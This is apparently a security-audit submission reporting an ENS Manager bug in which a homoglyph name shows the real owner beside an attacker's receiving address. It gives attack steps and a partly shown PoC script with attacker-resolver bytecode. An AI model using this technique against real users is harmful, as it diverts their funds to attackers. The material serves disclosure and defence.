# 91869 w a critical normalization mismatch between the owner and records queries in the manager profile route displays an attacker s name and address under the victim s ownership causing stealthy&#x20;

**Submitted on Sep 5th 2026 at 00:20:25 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91869
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Manager takes the name from the URL and derives it two ways. Ownership is computed on the ENSIP-15 normalized name; the records come from the raw string. Two spellings that normalize together can draw identically on screen, so one page shows the victim's true ownership next to the attacker's receiving address, and tells whoever is looking that the name is theirs.

A payer reads the attacker's address as the name's receiving address, beside the real owner. The name's real owner is shown an **Edit Profile** button, and inside it a field labelled "Your Ethereum Address" holding the attacker's address.

## Vulnerability Details

`routes/$name/route.tsx:5-13` is the whole param gate. It checks length and a dot and returns the string untouched. `routes/$name/index.tsx:166,173` hands it to `ProfileView`, which passes one `name` prop to both queries at `ProfileView.tsx:94` and `:100`.

The owner leg normalizes, `profileOwner.ts:25,56`:

```ts
const ethName = normalizeEthName(params.name)     // :25  -> profileName.ts:18 normalize(name)
ensjsv2_getOwner(client, { name: ethName.name })  // :56  NORMALIZED
```

The records leg does not, `profileRecords.ts:82,123-125`:

```ts
export const getProfileRecords = ResultFn(async function* (name: string) {  // :82  raw route param
  ...
  getRecords(client, { name, ... })                                        // :125 RAW
```

Measured on a fork of live Sepolia, through the app's own calls:

```
route param "crypto.eth"
    owner leg (normalized)         0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
    records leg (raw): resolver    0x75C7495CfD896FB78C4F6eF9f49Aa291232Cd116
    records leg (raw): ETH addr    (none)

route param "ⅽrypto.eth"
    owner leg (normalized)         0x0a7b367EE82E8a77fb2273f37848d4B8aD77bB57
    records leg (raw): resolver    0x4EF4C5AEcCF2Be4338D997333d83432C35bEf3f4
    records leg (raw): ETH addr    0x7738013316435525F00611fbc24fC48a3371688a
```

### What the page shows

The header, the page title and the owner row all read victim's name and owner address. Under the heading **Main receiving address**, inside a copy button (`ProfileAddressesSection.tsx:90-94,130-142`), the page prints the attacker's address. One click put it on the clipboard, recorded live during testing and provided in data.

### The app tells the visitor they own it

`ProfileView.tsx:115,119` computes `isOwner` from the normalized owner, and `ProfileEditAction.tsx:35` gates the button on it:

```ts
if (!isOwner || isInGrace || isUnmigratedEthName) return null
```

So for the real owner **EDIT PROFILE** renders on the attacker's name which is identical to the victim's on page. Opening it, the Addresses tab shows a field labelled **"Your Ethereum Address"** pre-filled with the attacker's address as shown in the screenshots, directly under the app's own sentence *"When someone sends funds to your name, it goes to your Ethereum address."* Screenshot: `evidence/edit-profile-attacker-address-shown.png`.

The same `isOwner` also suppresses the third-party renewal warning on this page. That is shown in the PoC below.

### The registrar accepts the label

`contracts-v2` `ETHRegistrar.register` performs a commitment check, an `InvalidOwner` check and `_checkAvailable`. There is no label-validity or normalization check. Registered on a fork of live Sepolia through the real registrar, from a fresh key with no relationship to the victim, for 8.000021 USDC.

### Vulnerable source code

**1. The unnormalized route param** @ `apps/manager/src/routes/$name/route.tsx:5-13`

```ts
parse: ({ name }) => {
  if (name.length < 3 || !name.includes('.')) {
    throw new Error('Invalid ENS name')
  }

  return {
    name,
  }
},
```

**2. The owner leg, normalized** @ `apps/manager/src/features/profile/service/profileOwner.ts:25,56`

```ts
const ethName = normalizeEthName(params.name)
...
const v2Owner = yield* fromPromise(
  ensjsv2_getOwner(client, { name: ethName.name }),
  (e) => new GetOwnerError({ cause: e }),
)
```

**3. The records leg, raw** @ `apps/manager/src/features/profile/service/profileRecords.ts:82,123-131`

```ts
export const getProfileRecords = ResultFn(async function* (name: string) {
```

```ts
const records = yield* fromPromise(
  getRecords(client, {
    name,
    texts,
    coins,
    contentHash: true,
    abi: true,
    ignoreInvalidCoinTypes: true,
  }),
  (error) => new GetProfileRecordsError({ cause: error }),
)
```

**4. Both queries, one prop** @ `apps/manager/src/features/profile/components/view/ProfileView.tsx:93-101`

```ts
const { data: profileRecords, refetch: refetchRecords } = useSuspenseQuery({
  ...profileRecordsQuery(name),
})
...
const { data: ownerData, isPending: isOwnerPending } = useQuery({
  ...profileOwnerQuery(name),
})
```

**5. `isOwner`, computed from the normalized owner** @ `apps/manager/src/features/profile/components/view/ProfileView.tsx:115,119`

```ts
const owner = ownerData?.owner as Address | undefined
...
const isOwner = useIsOwner({ owner })
```

**6. The Edit Profile gate** @ `apps/manager/src/features/profile/components/view/ProfileEditAction.tsx:35`

```ts
if (!isOwner || isInGrace || isUnmigratedEthName) return null
```

**7. The rendered address, in a copy button** @ `apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:90-94,130-142`

```tsx
<CopyableButton
  value={address.value}
  ...
```

**8. The app's own statement of what the record is for** @ `apps/manager/src/features/profile/components/dialogs/edit-profile/tabs/addresses/EvmAddressSection.tsx:40,51`

```tsx
description="When someone sends funds to your name, it goes to your Ethereum address. Pick which other chains you want your name to work on."
...
label="Your Ethereum Address"
```

## Impact Details

* **The application allows a victim to renew the attacker's name as it was theirs.** Upon clicking renew on a completely foreign name, a user is prompted a warning that this is not theirs: "That's generous of you! Renewing this name will add time to the current owner's registration. You won't gain ownership of the name, but you will make someone's day." But when a user clicks the attackers name isn't prompted, and forwarded to a renewal page, which completes successfully without any warning what so ever. The name remains in the attacker's possession.
* **A payer is shown the attacker's address as the name's receiving address.** The page prints owner `0x0a7b367E...`, registration date and expiry, all true and all the victim's, and prints `0x7738013316435525F00611fbc24fC48a3371688a` under the heading **Main receiving address** inside a copy button. a click wrote it to the clipboard, measured in via browser.
* **The app tells the name's real owner that the attacker's name is theirs.** Shows identical name and owner address key, EDIT PROFILE render because `ProfileEditAction.tsx:35` reads the normalized `isOwner`. Inside, under *"When someone sends funds to your name, it goes to your Ethereum address"*, the field **"Your Ethereum Address"** contains the attacker's address. The app is presenting it to the victim as their own.
* **The same false ownership reaches other flows on the page.** `shouldShowThirdPartyRenewalWarning` is `isOwner === false`, so the warning that would have told the visitor *"you will not gain ownership of the name"* never renders, and the label the renewal charges for is the raw one. Shown in the PoC.
* **Nothing warns about the mismatch.** No normalization warning exists anywhere in `apps/manager/src`. The other identity on the page comes from the normalized legs, so it prints the victim's real data and makes the page read as authentic.

## References

* `apps/manager/src/routes/$name/route.tsx:5-13` - the param gate, no normalization
* `apps/manager/src/routes/$name/index.tsx:166,173` - the raw param handed to the view
* `apps/manager/src/features/profile/components/view/ProfileView.tsx:94,100,115,119` - both queries, one prop, and `isOwner`
* `apps/manager/src/features/profile/service/profileOwner.ts:25,56` - the normalized leg
* `apps/manager/src/features/profile/service/profileName.ts:14-40` - `normalizeEthName`
* `apps/manager/src/features/profile/service/profileRecords.ts:82,123-131` - the raw leg
* `apps/manager/src/features/profile/components/view/ProfileEditAction.tsx:35` - the Edit Profile gate
* `apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:90-94,130-142` - the copy button
* `apps/manager/src/features/profile/components/dialogs/edit-profile/tabs/addresses/EvmAddressSection.tsx:40,51` - "Your Ethereum Address"
* `apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts:1-3` - `isOwner === false`, the suppressed warning
* `apps/manager/src/features/renew/components/ThirdPartyRenewalDialog.tsx:61-70` - the warning text
* `apps/manager/src/features/renew/utils/renewableName.ts:25-36` - the renewal label, never normalized

## Proof of Concept

## Proof of Concept

This was tested on a live running app, end-to-end, with logging every action from clipboard to a click, and everything validated. The renew transaction by the victim for the attacker is done without any warning, message or indicator unlike a control test where any user tries renewing any other user's name.

Screenshots show victims see attackers' pages as their own in multiple ways - Caps, special characters that may seem identical and propogate fake names via the search bar, etc. These victims are shown these names as their own, with attacker's addresses in copy and edit profile buttons.

1. Pick a target. Say crypto.eth.
2. Register a lookalike. A spelling that ENS treats as the same name but that is different bytes on chain. Two ways to get one:
   * ⅽrypto.eth, where the first letter is a roman numeral that draws as a c
   * é written as e plus a separate accent mark instead of one character Either way it costs 8 USDC and nobody checks the spelling.
3. Point it at your own resolver and set its address to your own wallet.
4. The victim opens that name.
5. The page asks two questions with two different spellings.
   * Who owns this? uses the corrected spelling, so it shows the real owner of crypto.eth, plus their real registration date and expiry. All true.
   * What is this name's address? uses the URL text as-is, so it shows the attacker's address. Both land on the same page. Nothing warns you.

Now it splits by who opened it.

If a payer opened it:

6. They see crypto.eth, the correct owner, and under Main receiving address the attacker's address.
7. One click copies it.
8. They paste and send. Money goes to the attacker.

If the real owner opened it

6. The app checked ownership with the corrected spelling, so it decides they own this name. EDIT PROFILE appears.
7. Inside, under the app's own line "When someone sends funds to your name, it goes to your Ethereum address", the field "Your Ethereum Address" shows the attacker's address. The app is telling them the attacker's wallet is theirs.
8. Same false ownership hides the renewal warning. Normally renewing someone else's name pops up "That's generous of you! ... You won't gain ownership of the name." It never appears, and RENEW NAME would charge them to extend the attacker's registration.

```bash
node poc.mjs
```

```js
#!/usr/bin/env node
//   1. forks live Sepolia with anvil
//   2. registers "ⅽrypto" through the REAL ETHRegistrar, paying the real price
//      in USDC, from a fresh key it generates. No impersonation of the attacker.
//   3. imports the target's OWN code out of the checkout and runs it:
//        normalizeEthName                    features/profile/service/profileName.ts
//        isConnectedProfileOwner             features/profile/components/view/connectedAccounts.helpers.ts
//        shouldShowThirdPartyRenewalWarning  features/renew/utils/thirdPartyRenewalWarning.ts
//        parseRenewableName                  features/renew/utils/renewableName.ts
//   4. prints the split, the suppressed warning, and the label that gets paid for

import { spawn, spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-v2-normalization-split')

const FORK_RPC = process.env.FORK_RPC ??
  'https://lb.drpc.live/sepolia/AnmpasF2C0JBqeAEzxVO8aRo7Ju0xlER8JS4QmlfqV1j'
// a fresh port per run, so a stale anvil from an earlier run never collides
const PORT = Number(process.env.POC_ANVIL_PORT ?? (8600 + Math.floor(Math.random() * 300)))
const RPC = `http://127.0.0.1:${PORT}`

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-v2-normalization-split",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "@ensdomains/address-encoder": "^1.1.3",
    "neverthrow": "^8.2.0",
    "ts-pattern": "^5.8.0",
    "valibot": "^1.1.0",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO
const TXM_SHIM = pathToFileURL(path.join(HERE, '_txm.mjs')).href
const RECORDS_SHIM = pathToFileURL(path.join(HERE, '_records.mjs')).href
const NT_SHIM = pathToFileURL(path.join(HERE, '_neverthrow.mjs')).href

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  // data/records is an icon catalogue: every module in it pulls React icon
  // components. validateAddress.ts uses one thing from it,
  // getAddressRecordDef(coinType)?.name, to word an error string. The real
  // validation beside it, getCoderByCoinType(60).decode(value), runs unmodified.
  if (specifier.endsWith('features/profile/data/records') && isRepoFile(context.parentURL))
    return nextResolve(RECORDS_SHIM, context)
  // apps/manager's own '@/...' -> 'apps/manager/src/...' alias (vite.config.ts)
  if (specifier.startsWith('@/') && isRepoFile(context.parentURL))
    return nextResolve(pathToFileURL(path.join(REPO, 'apps/manager/src', specifier.slice(2))).href, context)
  // some profile service modules import the transaction MANAGER at module top
  // level. Nothing this PoC calls touches it.
  if (specifier === '@ens-apps/transaction-manager') return nextResolve(TXM_SHIM, context)
  if (specifier === '@ens-apps/shared-schema')
    return nextResolve(pathToFileURL(path.join(REPO, 'packages/shared-schema/src/index.ts')).href, context)
  // TaggedError only, used by name-parser.ts for its error type
  if (specifier === '@ens-apps/utils/neverthrow') return nextResolve(NT_SHIM, context)
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

const TXM_SHIM = `export const transactionManager = undefined
export const getSmartAccountAddress = () => { throw new Error('not reached') }
export const waitForTransaction = () => { throw new Error('not reached') }
export const ENS_SEPOLIA_CONTRACTS = {}
`
const RECORDS_SHIM = `export const getAddressRecordDef = () => undefined
export const addressRecords = []
export const textRecords = []
`
const NT_SHIM = `export const TaggedError = (tag) => class extends Error {
  constructor(props) { super(tag); Object.assign(this, props ?? {}) }
}
export const ResultFn = (fn) => fn
`

// ============================================================== bootstrap

if (!process.env.ENS_POC_CHILD) {
  if (!existsSync(path.join(REPO, 'apps/manager/src/features/profile/service/profileRecords.ts'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }
  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, '_txm.mjs'), TXM_SHIM)
  writeFileSync(path.join(WORK, '_records.mjs'), RECORDS_SHIM)
  writeFileSync(path.join(WORK, '_neverthrow.mjs'), NT_SHIM)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, valibot, tsx)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }
  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== child process

const {
  createPublicClient, createWalletClient, http, namehash, keccak256,
  encodeAbiParameters, decodeFunctionData, parseAbi, pad, toHex, encodeFunctionData,
} = await import('viem')
const { sepolia } = await import('viem/chains')
const { privateKeyToAccount } = await import('viem/accounts')
const { extendChainWithEns } = await import('@ensdomains/ensjs/chain')
const { getRecords } = await import('@ensdomains/ensjs/public')
const { getOwner } = await import('@ensdomains/ensjs/public/v2')
const { normalize } = await import('viem/ens')
const R = await import('@ensdomains/ensjs-abi/v2/ethRegistrar')

// LAYER B: the target's own code, unmodified, out of the checkout.
const { normalizeEthName } = await import(
  '@ens-repo/apps/manager/src/features/profile/service/profileName.ts')
const { isConnectedProfileOwner } = await import(
  '@ens-repo/apps/manager/src/features/profile/components/view/connectedAccounts.helpers.ts')
const { shouldShowThirdPartyRenewalWarning } = await import(
  '@ens-repo/apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts')
const { parseRenewableName } = await import(
  '@ens-repo/apps/manager/src/features/renew/utils/renewableName.ts')

// ---------------------------------------------------------------- the two names
const VICTIM = 'crypto.eth'
const LABEL = String.fromCodePoint(0x217D) + 'rypto'   // U+217D renders as "c"
const RAW = LABEL + '.eth'

// Compiled AttackerResolver. Source in harness/AttackerResolver.sol: it answers
// for the name it is handed, and accepts writes from anyone so the app's
// resolverWriteAccess.ts dry run returns true and needsResolverSetup is false.
const ATTACKER_RESOLVER_BYTECODE =
  '0x608060405234801561000f575f5ffd5b50604051611b98380380611b98833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b611a8c8061010c5f395ff3fe608060405234801561000f575f5ffd5b50600436106100fe575f3560e01c8063623195b011610095578063ac9650d811610064578063ac9650d8146102cf578063bc1c58d1146102ff578063d5fa2b001461032f578063f1cb7e061461034b576100fe565b8063623195b0146102375780637aaecfbd146102535780638b95dd71146102835780639cf3bd151461029f576100fe565b80633b3b57de116100d15780633b3b57de1461019b57806348eb76ee146101cb57806359d1d43c146101e95780635f29891214610219576100fe565b806301ffc9a71461010257806310f13a8c146101325780632203ab561461014e578063304e6ade1461017f575b5f5ffd5b61011c60048036038101906101179190610a26565b61037b565b6040516101299190610a6b565b60405180910390f35b61014c60048036038101906101479190610b18565b61049c565b005b61016860048036038101906101639190610bdc565b6104f9565b604051610176929190610c99565b60405180910390f35b61019960048036038101906101949190610d1c565b610517565b005b6101b560048036038101906101b09190610d79565b610533565b6040516101c29190610de3565b60405180910390f35b6101d361055c565b6040516101e09190610de3565b60405180910390f35b61020360048036038101906101fe9190610dfc565b610580565b6040516102109190610eab565b60405180910390f35b61022161059a565b60405161022e9190610ecb565b60405180910390f35b610251600480360381019061024c9190610ee4565b6105a0565b005b61026d60048036038101906102689190610bdc565b6105bd565b60405161027a9190610f55565b60405180910390f35b61029d60048036038101906102989190610ee4565b610663565b005b6102b960048036038101906102b4919061109d565b6106b0565b6040516102c69190610eab565b60405180910390f35b6102e960048036038101906102e4919061114c565b61076e565b6040516102f6919061129a565b60405180910390f35b61031960048036038101906103149190610d79565b6108d6565b6040516103269190610f55565b60405180910390f35b610349600480360381019061034491906112e4565b6108ee565b005b61036560048036038101906103609190610bdc565b610957565b6040516103729190610f55565b60405180910390f35b5f6301ffc9a760e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806103d55750633b3b57de60e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b80610405575063f1cb7e0660e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b8061043557506359d1d43c60e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b80610465575063bc1c58d160e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b806104955750632203ab5660e01b827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b9050919050565b818160025f8881526020019081526020015f2086866040516104bf929190611350565b908152602001604051809103902091826104da92919061156f565b5060035f8154809291906104ed90611669565b91905055505050505050565b5f60605f60405180602001604052805f815250915091509250929050565b60035f81548092919061052990611669565b9190505550505050565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b606060405180602001604052805f81525090509392505050565b60035481565b60035f8154809291906105b290611669565b919050555050505050565b6001602052815f5260405f20602052805f5260405f205f915091505080546105e49061139f565b80601f01602080910402602001604051908101604052809291908181526020018280546106109061139f565b801561065b5780601f106106325761010080835404028352916020019161065b565b820191905f5260205f20905b81548152906001019060200180831161063e57829003601f168201915b505050505081565b818160015f8781526020019081526020015f205f8681526020019081526020015f209182610692929190611712565b5060035f8154809291906106a590611669565b919050555050505050565b6002602052815f5260405f20818051602081018201805184825260208301602085012081835280955050505050505f915091505080546106ef9061139f565b80601f016020809104026020016040519081016040528092919081815260200182805461071b9061139f565b80156107665780601f1061073d57610100808354040283529160200191610766565b820191905f5260205f20905b81548152906001019060200180831161074957829003601f168201915b505050505081565b60608282905067ffffffffffffffff81111561078d5761078c610f79565b5b6040519080825280602002602001820160405280156107c057816020015b60608152602001906001900390816107ab5790505b5090505f5f90505b838390508110156108cf575f5f3073ffffffffffffffffffffffffffffffffffffffff168686858181106107ff576107fe6117df565b5b90506020028101906108119190611818565b60405161081f9291906118a8565b5f60405180830381855af49150503d805f8114610857576040519150601f19603f3d011682016040523d82523d5f602084013e61085c565b606091505b5091509150816108a1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108989061190a565b60405180910390fd5b808484815181106108b5576108b46117df565b5b6020026020010181905250505080806001019150506107c8565b5092915050565b606060405180602001604052805f8152509050919050565b806040516020016108ff919061196d565b60405160208183030381529060405260015f8481526020019081526020015f205f603c81526020019081526020015f20908161093b9190611987565b5060035f81548092919061094e90611669565b91905055505050565b6060603c82036109a8575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16604051602001610992919061196d565b60405160208183030381529060405290506109ba565b60405180602001604052805f81525090505b92915050565b5f604051905090565b5f5ffd5b5f5ffd5b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b610a05816109d1565b8114610a0f575f5ffd5b50565b5f81359050610a20816109fc565b92915050565b5f60208284031215610a3b57610a3a6109c9565b5b5f610a4884828501610a12565b91505092915050565b5f8115159050919050565b610a6581610a51565b82525050565b5f602082019050610a7e5f830184610a5c565b92915050565b5f819050919050565b610a9681610a84565b8114610aa0575f5ffd5b50565b5f81359050610ab181610a8d565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f840112610ad857610ad7610ab7565b5b8235905067ffffffffffffffff811115610af557610af4610abb565b5b602083019150836001820283011115610b1157610b10610abf565b5b9250929050565b5f5f5f5f5f60608688031215610b3157610b306109c9565b5b5f610b3e88828901610aa3565b955050602086013567ffffffffffffffff811115610b5f57610b5e6109cd565b5b610b6b88828901610ac3565b9450945050604086013567ffffffffffffffff811115610b8e57610b8d6109cd565b5b610b9a88828901610ac3565b92509250509295509295909350565b5f819050919050565b610bbb81610ba9565b8114610bc5575f5ffd5b50565b5f81359050610bd681610bb2565b92915050565b5f5f60408385031215610bf257610bf16109c9565b5b5f610bff85828601610aa3565b9250506020610c1085828601610bc8565b9150509250929050565b610c2381610ba9565b82525050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f610c6b82610c29565b610c758185610c33565b9350610c85818560208601610c43565b610c8e81610c51565b840191505092915050565b5f604082019050610cac5f830185610c1a565b8181036020830152610cbe8184610c61565b90509392505050565b5f5f83601f840112610cdc57610cdb610ab7565b5b8235905067ffffffffffffffff811115610cf957610cf8610abb565b5b602083019150836001820283011115610d1557610d14610abf565b5b9250929050565b5f5f5f60408486031215610d3357610d326109c9565b5b5f610d4086828701610aa3565b935050602084013567ffffffffffffffff811115610d6157610d606109cd565b5b610d6d86828701610cc7565b92509250509250925092565b5f60208284031215610d8e57610d8d6109c9565b5b5f610d9b84828501610aa3565b91505092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610dcd82610da4565b9050919050565b610ddd81610dc3565b82525050565b5f602082019050610df65f830184610dd4565b92915050565b5f5f5f60408486031215610e1357610e126109c9565b5b5f610e2086828701610aa3565b935050602084013567ffffffffffffffff811115610e4157610e406109cd565b5b610e4d86828701610ac3565b92509250509250925092565b5f81519050919050565b5f82825260208201905092915050565b5f610e7d82610e59565b610e878185610e63565b9350610e97818560208601610c43565b610ea081610c51565b840191505092915050565b5f6020820190508181035f830152610ec38184610e73565b905092915050565b5f602082019050610ede5f830184610c1a565b92915050565b5f5f5f5f60608587031215610efc57610efb6109c9565b5b5f610f0987828801610aa3565b9450506020610f1a87828801610bc8565b935050604085013567ffffffffffffffff811115610f3b57610f3a6109cd565b5b610f4787828801610cc7565b925092505092959194509250565b5f6020820190508181035f830152610f6d8184610c61565b905092915050565b5f5ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b610faf82610c51565b810181811067ffffffffffffffff82111715610fce57610fcd610f79565b5b80604052505050565b5f610fe06109c0565b9050610fec8282610fa6565b919050565b5f67ffffffffffffffff82111561100b5761100a610f79565b5b61101482610c51565b9050602081019050919050565b828183375f83830152505050565b5f61104161103c84610ff1565b610fd7565b90508281526020810184848401111561105d5761105c610f75565b5b611068848285611021565b509392505050565b5f82601f83011261108457611083610ab7565b5b813561109484826020860161102f565b91505092915050565b5f5f604083850312156110b3576110b26109c9565b5b5f6110c085828601610aa3565b925050602083013567ffffffffffffffff8111156110e1576110e06109cd565b5b6110ed85828601611070565b9150509250929050565b5f5f83601f84011261110c5761110b610ab7565b5b8235905067ffffffffffffffff81111561112957611128610abb565b5b60208301915083602082028301111561114557611144610abf565b5b9250929050565b5f5f60208385031215611162576111616109c9565b5b5f83013567ffffffffffffffff81111561117f5761117e6109cd565b5b61118b858286016110f7565b92509250509250929050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f82825260208201905092915050565b5f6111da82610c29565b6111e481856111c0565b93506111f4818560208601610c43565b6111fd81610c51565b840191505092915050565b5f61121383836111d0565b905092915050565b5f602082019050919050565b5f61123182611197565b61123b81856111a1565b93508360208202850161124d856111b1565b805f5b8581101561128857848403895281516112698582611208565b94506112748361121b565b925060208a01995050600181019050611250565b50829750879550505050505092915050565b5f6020820190508181035f8301526112b28184611227565b905092915050565b6112c381610dc3565b81146112cd575f5ffd5b50565b5f813590506112de816112ba565b92915050565b5f5f604083850312156112fa576112f96109c9565b5b5f61130785828601610aa3565b9250506020611318858286016112d0565b9150509250929050565b5f81905092915050565b5f6113378385611322565b9350611344838584611021565b82840190509392505050565b5f61135c82848661132c565b91508190509392505050565b5f82905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602260045260245ffd5b5f60028204905060018216806113b657607f821691505b6020821081036113c9576113c8611372565b5b50919050565b5f819050815f5260205f209050919050565b5f6020601f8301049050919050565b5f82821b905092915050565b5f6008830261142b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826113f0565b61143586836113f0565b95508019841693508086168417925050509392505050565b5f819050919050565b5f61147061146b61146684610ba9565b61144d565b610ba9565b9050919050565b5f819050919050565b61148983611456565b61149d61149582611477565b8484546113fc565b825550505050565b5f5f905090565b6114b46114a5565b6114bf818484611480565b505050565b5b818110156114e2576114d75f826114ac565b6001810190506114c5565b5050565b601f821115611527576114f8816113cf565b611501846113e1565b81016020851015611510578190505b61152461151c856113e1565b8301826114c4565b50505b505050565b5f82821c905092915050565b5f6115475f198460080261152c565b1980831691505092915050565b5f61155f8383611538565b9150826002028217905092915050565b6115798383611368565b67ffffffffffffffff81111561159257611591610f79565b5b61159c825461139f565b6115a78282856114e6565b5f601f8311600181146115d4575f84156115c2578287013590505b6115cc8582611554565b865550611633565b601f1984166115e2866113cf565b5f5b82811015611609578489013582556001820191506020850194506020810190506115e4565b868310156116265784890135611622601f891682611538565b8355505b6001600288020188555050505b50505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61167382610ba9565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036116a5576116a461163c565b5b600182019050919050565b5f82905092915050565b5f819050815f5260205f209050919050565b601f82111561170d576116de816116ba565b6116e7846113e1565b810160208510156116f6578190505b61170a611702856113e1565b8301826114c4565b50505b505050565b61171c83836116b0565b67ffffffffffffffff81111561173557611734610f79565b5b61173f825461139f565b61174a8282856116cc565b5f601f831160018114611777575f8415611765578287013590505b61176f8582611554565b8655506117d6565b601f198416611785866116ba565b5f5b828110156117ac57848901358255600182019150602085019450602081019050611787565b868310156117c957848901356117c5601f891682611538565b8355505b6001600288020188555050505b50505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f5ffd5b5f5ffd5b5f5ffd5b5f5f833560016020038436030381126118345761183361180c565b5b80840192508235915067ffffffffffffffff82111561185657611855611810565b5b60208301925060018202360383131561187257611871611814565b5b509250929050565b5f81905092915050565b5f61188f838561187a565b935061189c838584611021565b82840190509392505050565b5f6118b4828486611884565b91508190509392505050565b7f6d756c746963616c6c206661696c6564000000000000000000000000000000005f82015250565b5f6118f4601083610e63565b91506118ff826118c0565b602082019050919050565b5f6020820190508181035f830152611921816118e8565b9050919050565b5f8160601b9050919050565b5f61193e82611928565b9050919050565b5f61194f82611934565b9050919050565b61196761196282610dc3565b611945565b82525050565b5f6119788284611956565b60148201915081905092915050565b61199082610c29565b67ffffffffffffffff8111156119a9576119a8610f79565b5b6119b3825461139f565b6119be8282856116cc565b5f60209050601f8311600181146119ef575f84156119dd578287015190505b6119e78582611554565b865550611a4e565b601f1984166119fd866116ba565b5f5b82811015611a24578489015182556001820191506020850194506020810190506119ff565b86831015611a415784890151611a3d601f891682611538565b8355505b6001600288020188555050505b50505050505056fea264697066735822122092818224abb39e2d7d410e8af694dc9f1e9cdcbaa0fb2543865dbf52c3edcab564736f6c634300081c0033'

const REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
